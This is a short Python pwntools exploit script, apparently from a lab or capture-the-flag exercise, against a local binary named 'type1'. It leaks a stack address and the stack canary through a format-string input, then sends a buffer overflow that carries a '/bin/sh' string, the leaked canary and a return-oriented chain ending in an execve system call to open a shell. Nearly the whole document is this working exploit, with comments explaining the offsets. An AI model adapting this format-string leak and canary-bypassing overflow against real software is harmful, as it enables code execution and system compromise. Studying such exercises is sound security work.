'''
Code injection attack for type 1 file
Author: Vishvajeet Patil
'''
from pwn import *
import sys

type1 = process(['./type1'])
print type1.proc.pid
sys.stdin.read(1)
print type1.recv()
type1.sendline("AAAA" + "%1$x." + "%135$x")
resp = type1.recv()
scanner = resp[4:12]
stackcookie = resp[13:21]
print scanner + " " + stackcookie
stackcookie = int(stackcookie,16)
# We are subtracting only 0x21e since we do not want 
scanner = int(scanner,16) - 0x21e
nstackcookie = struct.pack('<I',stackcookie)
'''
-----------------------------------------
NASM assembly code
pop ecx ; ret # make value 0
pop ebx ; ret # make value equal to string 
pop edx ; ret # make value equal to 0
mov eax,0xb # System call number 11 execve
int 0x80
-----------------------------------------
Difference in sizes of junk data is at 135th position and stack top starts at 7th position so 
(135-7) characters before canary value will be there
128*4 character - 10 character of "A\x00/bin/sh\x00" is junk so that equals to 512-10 = 510 characters in total of junk
'''
attack = ""
attack += "A\x00"
attack += "/bin/sh\x00"
attack += "D" * 502
attack += nstackcookie
attack += "JUNK" * 3
attack += "\xf1\xf0\x06\x08"
attack += "\x00\x00\x00\x00"
attack += struct.pack('<I',scanner)
attack += "\xca\xf0\x06\x08"
attack += "\x00\x00\x00\x00"
attack += "\x1f\xa9\x07\x08" * 11
attack += "\x35\xcd\x06\x08"
type1.sendline(attack)
'''
The interactive window is required since we have not given attention to input or output buffers.The below line takes care of that
'''
type1.interactive()